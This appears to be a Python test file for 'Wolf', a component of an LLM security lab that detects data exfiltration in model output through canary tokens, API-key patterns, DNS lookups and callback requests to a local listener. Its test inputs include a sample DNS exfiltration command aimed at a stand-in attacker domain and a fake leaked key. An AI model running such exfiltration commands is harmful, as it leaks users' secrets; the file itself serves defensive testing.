import os
import unittest
from unittest import mock

from hactu8 import providers
from hactu8.lamb import surfaces
from hactu8.lamb.wolf import Wolf, scan


class WolfScanTest(unittest.TestCase):
    def test_canary_is_the_only_confirmed_channel(self):
        self.assertEqual(scan(f"here {providers.canary()}")[0::2], ("canary", True))
        self.assertEqual(scan("key sk-abcdef0123456789xyz")[0::2], ("api_key", False))
        self.assertEqual(scan("nslookup nbswy3dpfqqho33snrsc.data.attacker.example")[0::2], ("dns", False))
        self.assertEqual(scan("post to http://127.0.0.1:5500/wolf/c?d=x")[0::2], ("callback", False))

    def test_clean_output_is_not_a_capture(self):
        for text in ("the current time is 2026-11-20T00:00:00Z",
                     "See https://docs.example/guide?page=2 for details.",
                     "Use the dig command to check DNS records.",
                     ""):
            self.assertIsNone(scan(text), text)

    def test_payload_urls_point_at_the_wolf(self):
        self.assertTrue(surfaces.WOLF_URL.startswith("http://127.0.0.1:"))
        self.assertTrue(surfaces.WOLF_URL.endswith("/wolf/c"))


class WolfInboxTest(unittest.TestCase):
    def test_capture_text_and_clear(self):
        wolf = Wolf()
        self.assertIsNone(wolf.capture_text("nothing here", source="llm01"))
        cap = wolf.capture_text(f"leak {providers.canary()}", source="llm01")
        self.assertTrue(cap.confirmed)
        self.assertTrue(wolf.confirmed())
        wolf.clear()
        self.assertEqual((wolf.loot(), wolf.confirmed()), ([], False))

    def test_request_without_canary_is_recorded_unconfirmed(self):
        wolf = Wolf()
        cap = wolf.receive("GET", "/wolf/c", "d=hello", "")
        self.assertFalse(cap.confirmed)
        self.assertEqual(cap.channel, "request")
        cap = wolf.receive("GET", "/wolf/c", f"d={providers.canary()}", "")
        self.assertTrue(cap.confirmed)

    def test_real_provider_key_is_redacted(self):
        with mock.patch.dict(os.environ, {"OPENAI_API_KEY": "sk-real-secret-value-123456"}):
            cap = Wolf().capture_text("leaked sk-real-secret-value-123456", source="x")
        self.assertNotIn("sk-real-secret-value-123456", cap.secret)
        self.assertFalse(cap.confirmed)


class WolfRouteTest(unittest.TestCase):
    def setUp(self):
        try:
            from starlette.testclient import TestClient

            from hactu8.lamb.app import create_app
            from hactu8.lamb.workers import LabWorkerManager
        except (ModuleNotFoundError, RuntimeError):
            self.skipTest("Lamb extra not installed")
        self.app = create_app(manager=LabWorkerManager(skills=[]))
        self.client = TestClient(self.app, base_url="http://127.0.0.1:5500")

    def tearDown(self):
        self.app.state.workers.close()

    def test_callback_lands_and_reset_clears(self):
        self.assertFalse(self.client.get("/api/lamb/wolf").json()["confirmed"])
        hit = self.client.get(f"/wolf/c?d={providers.canary()}").json()
        self.assertTrue(hit["confirmed"])
        loot = self.client.get("/api/lamb/wolf").json()
        self.assertTrue(loot["confirmed"])
        self.assertEqual(len(loot["captures"]), 1)
        self.client.post("/api/reset", json={})
        self.assertEqual(self.client.get("/api/lamb/wolf").json(), {"confirmed": False, "captures": []})

    def test_foreign_host_refused(self):
        self.assertEqual(self.client.get("/wolf/c?d=x", headers={"host": "evil.example"}).status_code, 403)


if __name__ == "__main__":
    unittest.main()
